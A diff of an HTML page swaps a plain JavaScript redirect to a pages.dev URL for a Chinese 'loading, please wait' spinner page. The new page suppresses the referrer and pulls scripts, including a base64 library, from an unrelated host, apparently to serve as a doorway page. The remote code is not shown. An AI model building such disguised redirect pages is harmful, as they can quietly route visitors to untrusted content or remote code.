@@ -1,16 +1,56 @@
-<html>
-<head>
-	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-	<meta http-equiv="X-UA-Compatible" content="IE=edge">
-	<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
-	<meta name="apple-mobile-web-app-capable" content="yes">
-	<meta name="apple-mobile-web-app-status-bar-style" content="black">
-	<meta name="format-detection" content="telephone=no">
-	<title>...</title>
+<!DOCTYPE html>
+<html><head>
+    <title>加载中,请等待...</title>
+    <meta name="referrer" content="no-referrer">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <style>
+        .loading {
+            margin: 20% auto;
+            width: 0;
+            height: 0;
+            border-right: 1rem solid #fff;
+            border-top: 1rem solid #09ed13;
+            border-left: 1rem solid #fff;
+            border-bottom: 1rem solid #09ed13;
+            border-radius: 1rem;
+            -moz-border-radius: 1rem;
+            -webkit-border-radius: 1rem;
+            animation: bganim 1.6s linear 0s infinite;
+            -moz-animation: bganim 1.6s linear 0s infinite;
+            -webkit-animation: bganim 1.6s linear 0s infinite;
+        }
+        @keyframes bganim {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        @-moz-keyframes bganim {
+            from {
+                -moz-transform: rotate(0deg);
+            }
+
+            to {
+                -moz-transform: rotate(360deg);
+            }
+        }
+        @-webkit-keyframes bganim {
+            from {
+                -webkit-transform: rotate(0deg);
+            }
+
+            to {
+                -webkit-transform: rotate(360deg);
+            }
+        }
+    </style>
+
 </head>
 <body>
-<script>
-window.location.href = "http://g-412-4.pages.dev/?a=d7d6248a378ad07ee79716e73f4c44bd";
-</script>
-</body>
-</html>
+<div class="loading" id="loading"></div>
+<script src="//cdn1.ttgzs.top/static/article/js/base64.min.js?v=8"></script>
+<script src="//cdn1.ttgzs.top/static/article/js/jquery-3.6.0.min.js?v=666"></script>
+</body></html>
